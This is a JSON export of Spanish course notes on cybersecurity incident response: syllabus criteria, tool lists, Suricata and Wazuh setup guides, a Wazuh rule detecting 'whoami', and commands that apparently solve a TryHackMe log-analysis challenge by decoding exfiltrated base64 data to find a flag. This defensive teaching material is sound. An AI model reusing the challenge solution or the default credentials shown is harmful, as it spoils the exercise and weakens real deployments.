Bro)\n\nDFIR\n\nVelociraptor\n\nSIRP\n\nTheHive\nDFIR-Iris\nDFIRTrack\nFast Incident Response (FIR)\nJIRA (gen√©rica)\n\nSOAR\n\nCatalyst\n\nFirewall\n\nHardware\nSoftware\n\nIPTables\nNFTables\n\n\n\nThreat Intelligence\n\nVirusTotal\nURLScan\nPalo alto network scanner\nAnyRun\nAbuseIPDB\nCisco Talos\n\nIOC\n\nMISP\nCortex\n\nHoneypots\nFrameworks\n\nNIST\nIncibe\nEsquema nacional de seguridad\n\nThreat hunting\n\nMitre ATT&amp;CK\n\nSO especializados\n\nSecurity Onion\nQubeOS\nTails\nWhonix\nFedora Silverblue\n\nOtros\n\nIAM\nNDR\n\nDigital Forensics (DF)\n\nAutopsy\nVolatility\nReglas Yara\nReglas Sigma\nWireshark\n\nConceptos\n\nTaxonom√≠a de incidentes\nTLP\nSeverity\nPlaybook\n\n"},"ceti/Incidentes-de-ciberseguridad/RA-2/gu√≠as/Suricata":{"title":"Suricata","links":[],"tags":[],"content":"Suricata\nInstalaci√≥n de software previo\napt update\napt install software-properties-common iproute-2 nano curl -y\napt install suricata -y\n\nVer la interfaz de red a usar y anotarla:\nip a\nnano /etc/suricata/suricata.yaml\n\nDentro del archivo, cambiar las siguientes 4 cosas:\n...\n\n  community-id: true\n  \n...\n\naf-packet:\n  - interface: &lt;la-anotada-tras-ip-a&gt;\n  \n... \n\ndefault-rule-path: /var/lib/suricata/rules\n\nrule-files:\n  - suricata.rules\n  \n...\n\n# Al final del archivo, incluir:\ndetect-engine:\n  -  rule-reload: true\n\nTras esto, guardar el archivo y ejecutar los siguientes comandos:\nsuricata-update\nsuricata-update list-sources\nsuricata-update enable-source et/open\nsuricata -T -c /etc/suricata/suricata.yaml -v\n\nSi nos da ok, todo est√° bien, habilitamos suricata cambiando el siguiente archivo:\nnano /etc/default/suricata\n\nDentro del archivo modificar ‚ÄúRUN=yes‚Äù\nFinalmente reiniciamos suricata:\npidof suricata\nkill &lt;pid-anterior&gt;\nsystemctl restart suricata\nsystemctl enable suricata\n\nProbamos suricata\ncurl testmynids.org/uid/index.html\ngrep 2100498 /var/log/suricata/fast.log\njq &#039;select(.alert .signature_id==2100498)&#039; /var/log/suricata/eve.json\n"},"ceti/Incidentes-de-ciberseguridad/RA-2/gu√≠as/Wazuh":{"title":"Wazuh","links":[],"tags":[],"content":"Qu√© es Wazuh\nUn EDR (Endpoint Detection and Response)\nC√≥mo instalar Wazuh\nEn AWS con Amazon Linux 2:\n# Para instalar docker\nsudo dnf install docker -y\nsudo systemctl start docker\nsudo systemctl enable docker\nsudo usermod -aG docker $USER\n \n# Aplicar los cambios a los grupos\nnewgrp docker\n \n# Para docker-compose: gist.github.com/npearce/6f3c7826c7499587f00957fee62f8ee9\nsudo curl -L github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m) -o /usr/local/bin/docker-compose\nsudo chmod +x /usr/local/bin/docker-compose\n \n# Probar que todo va bien\ndocker --version\ndocker-compose --version\n \n# Siguiendo la gu√≠a de Wazuh: \n# documentation.wazuh.com/current/deployment-options/docker/wazuh-container.html\nsudo dnf install git -y\ngit clone github.com/wazuh/wazuh-docker.git -b v4.11.2\ncd wazuh-docker/single-node\ndocker-compose -f generate-indexer-certs.yml run --rm generator\ndocker-compose up -d\n \n# Se habr√°n generado 3 contenedores. \n# Para que los contenedores se enciendan autom√°ticamente al encender la instancia\ndocker update --restart=always &lt;nombre-contenedor | ID&gt;\nDespu√©s de un tiempo ya podremos acceder a https://IP con el usuario admin y la contrase√±a SecretPassword.\nDespu√©s de esto hay que tener en cuenta los puertos que usa Wazuh y que habr√° que abrirlos en el Security Group (firewall) de la instancia EC2. M√°s info en: documentation.wazuh.com/current/getting-started/architecture.html#required-ports\n¬øC√≥mo se gestionan las reglas en Wazuh?\nDebemos acceder a la carpeta /var/ossec. Recordemos que ossec es una herramienta HIDS que usa Wazuh dentro de su arquitectura.\n\nLas reglas por defecto se encuentran en /var/ossec/ruleset/rules/. No debes modificar directamente estos archivos, ya que se sobrescribir√≠an en las actualizaciones.\nLas personalizaciones, como la creaci√≥n de nuevas reglas o la modificaci√≥n del comportamiento de las existentes (por ejemplo, cambiar su nivel o desactivarlas), se hacen principalmente en /var/ossec/etc/rules/local_rules.xml.\nLas reglas tienen un level (nivel). Por defecto, Wazuh suele generar alertas para reglas con nivel 3 o superior (esto se configura en ossec.conf).\nLas reglas est√°n organizadas l√≥gicamente en archivos seg√∫n su prop√≥sito (por ejemplo, 0015-ossec_rules.xml, 0210-pci_rules.xml, 0370-auditd_rules.xml, 0575-win_security_rules.xml, etc.). Wazuh carga las reglas incluidas en la configuraci√≥n.\n\n  &lt;rule id=&quot;100100&quot; level=&quot;12&quot;&gt;\n    &lt;decoded_as&gt;execve&lt;/decoded_as&gt;\n    &lt;command&gt;whoami&lt;/command&gt;\n    &lt;description&gt;Command &#039;whoami&#039; executed&lt;/description&gt;\n  ‚Äã&lt;/rule&gt;\n\nInstalaci√≥n de un agente\nEs muy sencillo, simplemente ir desde la web a crear un nuevo agente y seguir los pasos. En mi caso:\ncurl -o wazuh-agent-4.11.2-1.x86_64.rpm packages.wazuh.com/4.x/yum/wazuh-agent-4.11.2-1.x86_64.rpm\n \nsudo WAZUH_MANAGER=&#039;IP&#039; WAZUH_AGENT_GROUP=&#039;GRUPO&#039; WAZUH_AGENT_NAME=&#039;NOMBRE&#039; rpm -ihv wazuh-agent-4.11.2-1.x86_64.rpm\n \nsudo systemctl daemon-reload\nsudo systemctl enable wazuh-agent\nsudo systemctl start wazuh-agent"},"ceti/Incidentes-de-ciberseguridad/RA-3/3a---Recopilaci√≥n-de-evidencias":{"title":"3a - Recopilaci√≥n de evidencias","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\na) Se han recopilado y almacenado de forma segura evidencias de incidentes de ciberseguridad que afectan a la organizaci√≥n.\n\nContenido asociado: Recopilaci√≥n de evidencias.\n\nHerramientas\n\nDFIR: Velociraptor\nIm√°genes Forenses: FTK Imager (gratuito), dd / dc3dd (Linux).\n\nExplicar formatos (E01, raw).\n\n\nAdquisici√≥n de Memoria: Volatility Framework (plugins de adquisici√≥n), Redline (FireEye).\nCadena de Custodia: Plantillas de formularios.\nHashing: Herramientas para calcular hashes (md5sum, sha256sum, FTK Imager).\nAlmacenamiento Seguro: Contenedores cifrados (VeraCrypt).\n"},"ceti/Incidentes-de-ciberseguridad/RA-3/3b---An√°lisis-de-evidencias.":{"title":"3b - An√°lisis de evidencias.","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nb) Se ha realizado un an√°lisis de evidencias.\n\nContenido asociado: An√°lisis de evidencias.\n\nHerramientas\n\nComprobaci√≥n web de IOCs\n\nVirusTotal\nMetadefender: metadefender.com/\nURLScan\nPalo alto network scanner\nAnyRun\nAbuseIPDB\nCisco Talos\n\n\nPlataformas Forenses: Autopsy (open source), EnCase/FTK (comerciales, quiz√°s versiones de prueba/educacionales si existen).\nAn√°lisis de Memoria: Volatility Framework\nAn√°lisis de Red: Wireshark.\nAn√°lisis de Logs: Herramientas de SIEM, grep, awk, Log2Timeline/Plaso.\nherramientas de an√°lisis est√°tico: strings, PEview\neditores hexadecimales: HxD\nSandbox\n\ngithub.com/kevoreilly/CAPEv2\ngithub.com/cert-ee/cuckoo3\n\n\n"},"ceti/Incidentes-de-ciberseguridad/RA-3/3c---Investigaci√≥n-del-incidente":{"title":"3c - Investigaci√≥n del incidente","links":["ceti/Incidentes-de-ciberseguridad/RA-2/2e---Clasificaci√≥n,-valoraci√≥n,-documentaci√≥n,-seguimiento-inicial-de-incidentes-de-ciberseguridad"],"tags":[],"content":"Criterio de evaluaci√≥n:\nc) Se ha realizado la investigaci√≥n de incidentes de ciberseguridad.\n\nContenido asociado: Investigaci√≥n del incidente\n\nConceptos\n\nMetodolog√≠as de investigaci√≥n (basadas en hip√≥tesis).\n\nHerramientas\n\nHerramientas de l√≠nea de tiempo (Timeline Explorer, Plaso).\nHerramientas de mind mapping (FreeMind, XMind) para organizar hallazgos.\n\nSe puede usar obsidian con plugin mindmap\n\n\nAn√°lisis\n\nAutopsy\nVolatility\nReglas Yara\nReglas Sigma\nWireshark\n\n\nPlataformas de gesti√≥n de casos (TheHive o DFIR-Iris, ya usadas en 2e - Clasificaci√≥n, valoraci√≥n, documentaci√≥n, seguimiento inicial de incidentes de ciberseguridad).\n"},"ceti/Incidentes-de-ciberseguridad/RA-3/3d---Intercambio-de-informaci√≥n-del-incidente-con-proveedores-u-organismos-competentes.":{"title":"3d - Intercambio de informaci√≥n del incidente con proveedores u organismos competentes.","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nd) Se ha intercambiado informaci√≥n de incidentes, con proveedores y/o organismos competentes que podr√≠an hacer aportaciones al respecto.\n\nContenido asociado: Intercambio de informaci√≥n del incidente con proveedores u organismos competentes.\n\nHerramientas para intercambiar informaci√≥n de IOC\n\nMISP\nCortex\n\nCERT relevantes\n\nINCIBE-CERT\nCCN-CERT\nENISA - CERTs europeos: tools.enisa.europa.eu/topics/incident-response/csirt-inventory/certs-by-country-interactive-map\n\nFormato de intercambio de Cyberthreat intelligence (CTI)\n\nSTIX\nTAXII\n\nHerramientas de comunicaci√≥n segura\n\nPGP\n\nEjemplo: incibe www.incibe.es/incibe-cert/sobre-incibe-cert/claves-publicas-pgp\n\n\nSignal\n"},"ceti/Incidentes-de-ciberseguridad/RA-3/3e---Medidas-de-contenci√≥n-de-incidentes.":{"title":"3e - Medidas de contenci√≥n de incidentes.","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\ne) Se han iniciado las primeras medidas de contenci√≥n de los incidentes para limitar los posibles da√±os causados.\n\nContenido asociado: Medidas de contenci√≥n de incidentes.\n\nHerramientas\n\nMitre ATT&amp;CK\n\nT√©cnicas\n\nT√©cnicas de aislamiento (desconexi√≥n de red, VLANs).\nBloqueo en firewalls/proxies (interfaces de gesti√≥n simuladas o reales si es posible).\nDeshabilitaci√≥n de cuentas (Active Directory/Linux).\n\nOtros\n\nPlaybooks/checklists de contenci√≥n para tipos espec√≠ficos de incidentes (ej. ransomware).\n"},"ceti/Incidentes-de-ciberseguridad/RA-3/gu√≠as/analisis-de-logs":{"title":"analisis-de-logs","links":[],"tags":[],"content":"An√°lisis de logs\nComandos interesantes:\n\ncut\nsort\nuniq\nnl\nwc\ngrep\nbase64\n\nPregunta 1\ncut -d &#039; &#039; -f2 access.log | sort | uniq -c | sort -n | nl\nPregunta 2\ncut -d &#039; &#039; -f3 access.log | cut -d &#039;:&#039; -f1 |sort | uniq | sort -n | nl\nPregunta 3\ncut -d &#039; &#039; -f3 access.log | cut -d &#039;:&#039; -f1 | sort | uniq -c | sort -nr\ngrep partnerservices.getmicrosoftkey.com access.log | cut -d &#039; &#039; -f6 | sort | uniq\nPregunta 4\ncut -d &#039; &#039; -f3 access.log | cut -d &#039;:&#039; -f1 |sort | uniq -c | sort -n | nl | tail -n 5\nPregunta 5\ngrep frostlings.bigbadstash.thm access.log | grep 200 | cut -d &#039; &#039; -f2 | sort | uniq\nPregunta 6\ngrep frostlings.bigbadstash.thm access.log | cut -d &#039; &#039; -f5 | cut -d &#039;=&#039; -f2 | base64 -d\ngrep frostlings.bigbadstash.thm access.log | cut -d &#039; &#039; -f5 | cut -d &#039;=&#039; -f2 | base64 -d | grep -i THM{"},"ceti/Incidentes-de-ciberseguridad/RA-4/4a---Desarrollar-procedimientos-de-actuaci√≥n-detallados-para-dar-respuesta,-mitigar,-eliminar-o-contener-los-tipos-de-incidentes":{"title":"4a - Desarrollar procedimientos de actuaci√≥n detallados para dar respuesta, mitigar, eliminar o contener los tipos de incidentes","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\na) Se han desarrollado procedimientos de actuaci√≥n detallados para dar respuesta, mitigar, eliminar o contener los tipos de incidentes de ciberseguridad m√°s habituales.\n\nContenido asociado: Desarrollar procedimientos de actuaci√≥n detallados para dar respuesta, mitigar, eliminar o contener los tipos de incidentes.\n\nConceptos\n\nPlantillas de IRP (ej. SANS).\nEjemplos de playbooks espec√≠ficos (malware, phishing, etc.).\nPlaybooks, Runbooks, Standard Operation Procedure‚Ä¶\n\nHerramientas\n\nHerramientas de diagramaci√≥n (draw.io, Visio) para flujos de trabajo.\nSe puede usar Obsidian (herramienta Canvas de obsidian)\n"},"ceti/Incidentes-de-ciberseguridad/RA-4/4b---Implantar-capacidades-de-ciberresiliencia":{"title":"4b - Implantar capacidades de ciberresiliencia","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nb) Se han preparado respuestas ciberresilientes ante incidentes que permitan seguir prestando los servicios de la organizaci√≥n y fortaleciendo las capacidades de identificaci√≥n, detecci√≥n, prevenci√≥n, contenci√≥n, recuperaci√≥n y cooperaci√≥n con terceros.\n\nContenido asociado: Implantar capacidades de ciberresiliencia.\n\nConceptos\n\nConceptos de BCP/DRP (plantillas b√°sicas).\nSoftware de backup (ej. Veeam - versi√≥n comunitaria, herramientas nativas de SO).\nTecnolog√≠as de virtualizaci√≥n (VMware, VirtualBox, Hyper-V) para discutir alta disponibilidad/failover.\nDiscusi√≥n sobre redundancia (RAID, balanceadores de carga).\n\nSO especializados\n\nSecurity Onion\nQubeOS\nTails\nWhonix\nFedora Silverblue\n"},"ceti/Incidentes-de-ciberseguridad/RA-4/4c---Establecer-flujos-de-toma-de-decisiones-y-escalado-interno-o-externo-adecuados":{"title":"4c - Establecer flujos de toma de decisiones y escalado interno o externo adecuados","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nc) Se ha establecido un flujo de toma de decisiones y escalado de incidentes interno y/o externo adecuados.\n\nContenido asociado: Establecer flujos de toma de decisiones y escalado interno y/o externo adecuados.\n\nConceptos\n\nMatrices de escalado.\nDiagramas de flujo de comunicaci√≥n.\nDefinici√≥n de roles y responsabilidades (matriz RACI).\nHerramientas de comunicaci√≥n colaborativa (Slack, Teams - simulaci√≥n).\n"},"ceti/Incidentes-de-ciberseguridad/RA-4/4d---Tareas-para-reestablecer-los-servicios-afectados-por-incidentes":{"title":"4d - Tareas para reestablecer los servicios afectados por incidentes","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nd) Se han llevado a cabo las tareas de restablecimiento de los servicios afectados por un incidente hasta confirmar la vuelta a la normalidad.\n\nContenido asociado: Tareas para reestablecer los servicios afectados por incidentes.\n\nHerramientas\n\nHerramientas de gesti√≥n de parches (WSUS, apt/yum).\nEsc√°neres de vulnerabilidades (OpenVAS/GVM, Nessus Essentials).\nGu√≠as de hardening (CIS Benchmarks).\nProcedimientos de restauraci√≥n de backups.\nChecklists de validaci√≥n post-recuperaci√≥n.\n"},"ceti/Incidentes-de-ciberseguridad/RA-4/4e---Documentaci√≥n":{"title":"4e - Documentaci√≥n","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\ne) Se han documentado las acciones realizadas y las conclusiones que permitan mantener un registro de ‚Äúlecciones aprendidas‚Äù.\n\nContenido asociado: Documentaci√≥n\n\nConceptos\n\nPlantillas de informes post-incidente.\nPlataformas de documentaci√≥n (Wikis como MediaWiki, Confluence, SharePoint).\nAgendas/plantillas para reuniones de ‚Äúlecciones aprendidas‚Äù.\n"},"ceti/Incidentes-de-ciberseguridad/RA-4/4f----Seguimiento-de-incidentes-para-evitar-una-situaci√≥n-similar":{"title":"4f -  Seguimiento de incidentes para evitar una situaci√≥n similar","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nf) Se ha realizado un seguimiento adecuado del incidente para evitar que una situaci√≥n similar se vuelva a repetir.\n\nContenido asociado: Seguimiento de incidentes para evitar una situaci√≥n similar.\n\nConceptos\n\nHerramientas de monitorizaci√≥n (SIEM, Nagios, Zabbix) para verificar la normalidad y detectar recurrencias.\nSistemas de ticketing para seguimiento de acciones correctivas a largo plazo.\n"},"ceti/Incidentes-de-ciberseguridad/RA-5/5a---Desarrollar-procedimientos-de-actuaci√≥n-para-la-notificaci√≥n-de-incidentes":{"title":"5a - Desarrollar procedimientos de actuaci√≥n para la notificaci√≥n de incidentes","links":[],"tags":[],"content":"Criterios de evaluaci√≥n:\na) Se ha desarrollado un procedimiento de actuaci√≥n detallado para la notificaci√≥n de incidentes de ciberseguridad en los tiempos adecuados.\n\nContenido asociado: Desarrollar procedimientos de actuaci√≥n para la notificaci√≥n de incidentes.\n\nConceptos\n\nGu√≠as de notificaci√≥n de la AEPD, INCIBE-CERT, CCN-CERT.\nPlantillas de procedimientos de notificaci√≥n interna/externa.\nDiagramas de flujo con criterios y plazos.\n\nMaterial de apoyo:\n\nIncibe - gu√≠a naciona de notificaci√≥n y gesti√≥n de ciberincidentes: www.incibe.es/sites/default/files/contenidos/guias/doc/guia_nacional_notificacion_gestion_ciberincidentes.pdf\nCCN-CERT www.ccn-cert.cni.es/es/series-ccn-stic/800-guia-esquema-nacional-de-seguridad/988-ccn-stic-817-gestion-de-ciberincidentes/file\n"},"ceti/Incidentes-de-ciberseguridad/RA-5/5b---Notificaci√≥n-interna-de-incidentes":{"title":"5b - Notificaci√≥n interna de incidentes","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nb) Se ha notificado el incidente de manera adecuada al personal interno de la organizaci√≥n responsable de la toma de decisiones.\n\nContenido asociado: Notificaci√≥n interna de incidentes.\n\nConceptos\n\nPlantillas de correo electr√≥nico/comunicado interno.\nListas de contactos clave internos (simuladas).\n"},"ceti/Incidentes-de-ciberseguridad/RA-5/5c---Notificaci√≥n-de-incidentes-a-quienes-corresponda":{"title":"5c - Notificaci√≥n de incidentes a quienes corresponda","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nc) Se ha notificado el incidente de manera adecuada a las autoridades competentes en el √°mbito de la gesti√≥n de incidentes de ciberseguridad en caso de ser necesario.\n\nContenido asociado: Notificaci√≥n de incidentes a quienes corresponda.\n\nConceptos\n\nPlantillas de correo electr√≥nico/comunicado interno.\nListas de contactos clave internos (simuladas).\n\nMateriales de apoyo\n\nIncibe: www.incibe.es/empresas/te-ayudamos/reporta-tu-incidente\nIncibe - PGP: www.incibe.es/incibe-cert/sobre-incibe-cert/claves-publicas-pgp\nCCN-CERT: www.ccn-cert.cni.es/es/gestion-de-incidentes/notificacion-de-incidentes\n"},"ceti/Incidentes-de-ciberseguridad/RA-5/5d---Notificaci√≥n-forma-de-incidentes-a-afectados":{"title":"5d - Notificaci√≥n forma de incidentes a afectados","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nd) Se ha notificado formalmente el incidente a los afectados, personal interno, clientes, proveedores, etc., en caso de ser necesario.\nConceptos\n\nGu√≠as sobre requisitos del RGPD (Art. 34).\nPlantillas de notificaci√≥n a afectados (clientes, empleados).\nConsideraciones sobre el canal de comunicaci√≥n (email, carta, web).\n"},"ceti/Incidentes-de-ciberseguridad/RA-5/5e---Notificaci√≥n-de-incidentes-a-medios-de-comunicaci√≥n":{"title":"5e - Notificaci√≥n de incidentes a medios de comunicaci√≥n","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\ne) Se ha notificado el incidente a los medios de comunicaci√≥n en caso de ser necesario.\nConceptos\n\nPrincipios de comunicaci√≥n de crisis.\nPlantillas de comunicados de prensa (muy b√°sicos).\nDiscusi√≥n sobre la figura del portavoz.\nEjemplos (buenos y malos) de gesti√≥n de comunicaci√≥n de incidentes p√∫blicos.\n"},"ceti/Incidentes-de-ciberseguridad/Temario":{"title":"Temario","links":["ceti/Incidentes-de-ciberseguridad/RA-1/1a---Principios-generales-en-materia-de-ciberseguridad","ceti/Incidentes-de-ciberseguridad/RA-1/1b---Normativa-de-protecci√≥n-del-puesto-del-trabajo.","ceti/Incidentes-de-ciberseguridad/RA-1/1c---Plan-de-formaci√≥n-y-concienciaci√≥n-en-materia-de-ciberseguridad","ceti/Incidentes-de-ciberseguridad/RA-1/1d---Materiales-de-formaci√≥n-y-concienciaci√≥n","ceti/Incidentes-de-ciberseguridad/RA-1/1e---Auditor√≠as-internas-de-cumplimiento-en-materia-de-prevenci√≥n","ceti/Incidentes-de-ciberseguridad/RA-2/2a---Taxonom√≠a-de-incidentes-de-ciberseguridad","ceti/Incidentes-de-ciberseguridad/RA-2/2b---Monitorizaci√≥n,-identificaci√≥n,-detecci√≥n-y-alerta-de-incidentes","ceti/Incidentes-de-ciberseguridad/RA-2/2c---Detecci√≥n-e-identificaci√≥n-de-incidentes-de-seguridad-f√≠sica","ceti/Incidentes-de-ciberseguridad/RA-2/2d---Monitorizaci√≥n,-identificaci√≥n,-detecci√≥n-y-alerta-de-incidentes-a-trav√©s-de-OSINT","ceti/Incidentes-de-ciberseguridad/RA-2/2e---Clasificaci√≥n,-valoraci√≥n,-documentaci√≥n,-seguimiento-inicial-de-incidentes-de-ciberseguridad","ceti/Incidentes-de-ciberseguridad/RA-3/3a---Recopilaci√≥n-de-evidencias","ceti/Incidentes-de-ciberseguridad/RA-3/3b---An√°lisis-de-evidencias.","ceti/Incidentes-de-ciberseguridad/RA-3/3c---Investigaci√≥n-del-incidente","ceti/Incidentes-de-ciberseguridad/RA-3/3d---Intercambio-de-informaci√≥n-del-incidente-con-proveedores-u-organismos-competentes.","ceti/Incidentes-de-ciberseguridad/RA-3/3e---Medidas-de-contenci√≥n-de-incidentes.","ceti/Incidentes-de-ciberseguridad/RA-4/4a---Desarrollar-procedimientos-de-actuaci√≥n-detallados-para-dar-respuesta,-mitigar,-eliminar-o-contener-los-tipos-de-incidentes","ceti/Incidentes-de-ciberseguridad/RA-4/4b---Implantar-capacidades-de-ciberresiliencia","ceti/Incidentes-de-ciberseguridad/RA-4/4c---Establecer-flujos-de-toma-de-decisiones-y-escalado-interno-o-externo-adecuados","ceti/Incidentes-de-ciberseguridad/RA-4/4d---Tareas-para-reestablecer-los-servicios-afectados-por-incidentes","ceti/Incidentes-de-ciberseguridad/RA-4/4e---Documentaci√≥n","ceti/Incidentes-de-ciberseguridad/RA-4/4f----Seguimiento-de-incidentes-para-evitar-una-situaci√≥n-similar","ceti/Incidentes-de-ciberseguridad/RA-5/5a---Desarrollar-procedimientos-de-actuaci√≥n-para-la-notificaci√≥n-de-incidentes","ceti/Incidentes-de-ciberseguridad/RA-5/5b---Notificaci√≥n-interna-de-incidentes","ceti/Incidentes-de-ciberseguridad/RA-5/5c---Notificaci√≥n-de-incidentes-a-quienes-corresponda","ceti/Incidentes-de-ciberseguridad/RA-5/5d---Notificaci√≥n-forma-de-incidentes-a-afectados","ceti/Incidentes-de-ciberseguridad/RA-5/5e---Notificaci√≥n-de-incidentes-a-medios-de-comunicaci√≥n"],"tags":["Apuntes","Temas","Incidentes"],"content":"Desglose del temario IC: RA - Criterios - Contenidos\nRA1. Desarrolla planes de prevenci√≥n y concienciaci√≥n en ciberseguridad, estableciendo normas y medidas de protecci√≥n.\nCriterios de evaluaci√≥n:\na) Se han definido los principios generales de la organizaci√≥n en materia de ciberseguridad, que deben ser conocidos y apoyados por la direcci√≥n de la misma.\n\nContenido asociado: Principios generales en materia de ciberseguridad.\nEnlace con el material para impartirlo: 1a - Principios generales en materia de ciberseguridad\n\nb) Se ha establecido una normativa de protecci√≥n del puesto de trabajo.\n\nContenido asociado: Normativa de protecci√≥n del puesto del trabajo.\nEnlace con el material para impartirlo: 1b - Normativa de protecci√≥n del puesto del trabajo.\n\nc) Se ha definido un plan de concienciaci√≥n de ciberseguridad dirigido a los empleados.\n\nContenido asociado: Plan de formaci√≥n y concienciaci√≥n en materia de ciberseguridad.\nEnlace con el material para impartirlo: 1c - Plan de formaci√≥n y concienciaci√≥n en materia de ciberseguridad\n\nd) Se ha desarrollado el material necesario para llevar a cabo las acciones de concienciaci√≥n dirigidas a los empleados.\n\nContenido asociado: Materiales de formaci√≥n y concienciaci√≥n.\nEnlace con el material para impartirlo: 1d - Materiales de formaci√≥n y concienciaci√≥n\n\ne) Se ha realizado una auditor√≠a para verificar el cumplimiento del plan de prevenci√≥n y concienciaci√≥n de la organizaci√≥n.\n\nContenido asociado: Auditor√≠as internas de cumplimiento en materia de prevenci√≥n.\nEnlace con el material para impartirlo: 1e - Auditor√≠as internas de cumplimiento en materia de prevenci√≥n\n\n2. Analiza incidentes de ciberseguridad utilizando herramientas, mecanismos de detecci√≥n y alertas de seguridad.\nCriterios de evaluaci√≥n:\na) Se ha clasificado y definido la taxonom√≠a de incidentes de ciberseguridad que pueden afectar a la organizaci√≥n.\n\nContenido asociado: Taxonom√≠a de incidentes de ciberseguridad.\nEnlace con el material para impartirlo: 2a - Taxonom√≠a de incidentes de ciberseguridad\n\nb) Se han establecido controles, herramientas y mecanismos de monitorizaci√≥n, identificaci√≥n, detecci√≥n y alerta de incidentes\n\nContenido asociado: Controles, herramientas y mecanismos de monitorizaci√≥n, identificaci√≥n, detecci√≥n y alerta de incidentes: tipos y fuentes\nEnlace con el material para impartirlo: 2b - Monitorizaci√≥n, identificaci√≥n, detecci√≥n y alerta de incidentes\n\nc) Se han establecido controles y mecanismos de detecci√≥n e identificaci√≥n de incidentes de seguridad f√≠sica.\n\nContenido asociado: Controles, herramientas y mecanismos de detecci√≥n e identificaci√≥n de incidentes de seguridad f√≠sica.\nEnlace con el material para impartirlo: 2c - Detecci√≥n e identificaci√≥n de incidentes de seguridad f√≠sica\n\nd) Se han establecido controles, herramientas y mecanismos de monitorizaci√≥n, identificaci√≥n, detecci√≥n y alerta de incidentes a trav√©s de la investigaci√≥n en fuentes abiertas (OSINT: Open Source Intelligence).\n\nContenido asociado: Controles, herramientas y mecanismos de monitorizaci√≥n, identificaci√≥n, detecci√≥n y alerta de incidentes a trav√©s de la investigaci√≥n en fuentes abiertas (OSINT).\nEnlace con el material para impartirlo: 2d - Monitorizaci√≥n, identificaci√≥n, detecci√≥n y alerta de incidentes a trav√©s de OSINT\n\ne) Se ha realizado una clasificaci√≥n, valoraci√≥n, documentaci√≥n y seguimiento de los incidentes detectados dentro de la organizaci√≥n.\n\nContenido asociado: Clasificaci√≥n, valoraci√≥n, documentaci√≥n, seguimiento inicial de incidentes de ciberseguridad.\nEnlace con el material para impartirlo: 2e - Clasificaci√≥n, valoraci√≥n, documentaci√≥n, seguimiento inicial de incidentes de ciberseguridad\n\n3. Investiga incidentes de ciberseguridad analizando los riesgos implicados y definiendo las posibles medidas a adoptar.\nCriterios de evaluaci√≥n:\na) Se han recopilado y almacenado de forma segura evidencias de incidentes de ciberseguridad que afectan a la organizaci√≥n.\n\nContenido asociado: Recopilaci√≥n de evidencias.\nEnlace con el material para impartirlo: 3a - Recopilaci√≥n de evidencias\n\nb) Se ha realizado un an√°lisis de evidencias.\n\nContenido asociado: An√°lisis de evidencias.\nEnlace con el material para impartirlo: 3b - An√°lisis de evidencias.\n\nc) Se ha realizado la investigaci√≥n de incidentes de ciberseguridad.\n\nContenido asociado: Investigaci√≥n del incidente\nEnlace con el material para impartirlo: 3c - Investigaci√≥n del incidente\n\nd) Se ha intercambiado informaci√≥n de incidentes, con proveedores y/o organismos competentes que podr√≠an hacer aportaciones al respecto.\n\nContenido asociado: Intercambio de informaci√≥n del incidente con proveedores u organismos competentes.\nEnlace con el material para impartirlo: 3d - Intercambio de informaci√≥n del incidente con proveedores u organismos competentes.\n\ne) Se han iniciado las primeras medidas de contenci√≥n de los incidentes para limitar los posibles da√±os causados.\n\nContenido asociado: Medidas de contenci√≥n de incidentes.\nEnlace con el material para impartirlo: 3e - Medidas de contenci√≥n de incidentes.\n\n4. Implementa medidas de ciberseguridad en redes y sistemas respondiendo a los incidentes detectados y aplicando las t√©cnicas de protecci√≥n adecuadas.\nCriterios de evaluaci√≥n:\na) Se han desarrollado procedimientos de actuaci√≥n detallados para dar respuesta, mitigar, eliminar o contener los tipos de incidentes de ciberseguridad m√°s habituales.\n\nContenido asociado: Desarrollar procedimientos de actuaci√≥n detallados para dar respuesta, mitigar, eliminar o contener los tipos de incidentes.\nEnlace con el material para impartirlo: 4a - Desarrollar procedimientos de actuaci√≥n detallados para dar respuesta, mitigar, eliminar o contener los tipos de incidentes\n\nb) Se han preparado respuestas ciberresilientes ante incidentes que permitan seguir prestando los servicios de la organizaci√≥n y fortaleciendo las capacidades de identificaci√≥n, detecci√≥n, prevenci√≥n, contenci√≥n, recuperaci√≥n y cooperaci√≥n con terceros.\n\nContenido asociado: Implantar capacidades de ciberresiliencia.\nEnlace con el material para impartirlo: 4b - Implantar capacidades de ciberresiliencia\n\nc) Se ha establecido un flujo de toma de decisiones y escalado de incidentes interno y/o externo adecuados.\n\nContenido asociado: Establecer flujos de toma de decisiones y escalado interno y/o externo adecuados.\nEnlace con el material para impartirlo: 4c - Establecer flujos de toma de decisiones y escalado interno o externo adecuados\n\nd) Se han llevado a cabo las tareas de restablecimiento de los servicios afectados por un incidente hasta confirmar la vuelta a la normalidad.\n\nContenido asociado: Tareas para reestablecer los servicios afectados por incidentes.\nEnlace con el material para impartirlo: 4d - Tareas para reestablecer los servicios afectados por incidentes\n\ne) Se han documentado las acciones realizadas y las conclusiones que permitan mantener un registro de ‚Äúlecciones aprendidas‚Äù.\n\nContenido asociado: Documentaci√≥n\nEnlace con el material para impartirlo: 4e - Documentaci√≥n\n\nf) Se ha realizado un seguimiento adecuado del incidente para evitar que una situaci√≥n similar se vuelva a repetir.\n\nContenido asociado: Seguimiento de incidentes para evitar una situaci√≥n similar.\nEnlace con el material para impartirlo: 4f -  Seguimiento de incidentes para evitar una situaci√≥n similar\n\n5. Detecta y documenta incidentes de ciberseguridad siguiendo procedimientos de actuaci√≥n establecidos.\nCriterios de evaluaci√≥n:\na) Se ha desarrollado un procedimiento de actuaci√≥n detallado para la notificaci√≥n de incidentes de ciberseguridad en los tiempos adecuados.\n\nContenido asociado: Desarrollar procedimientos de 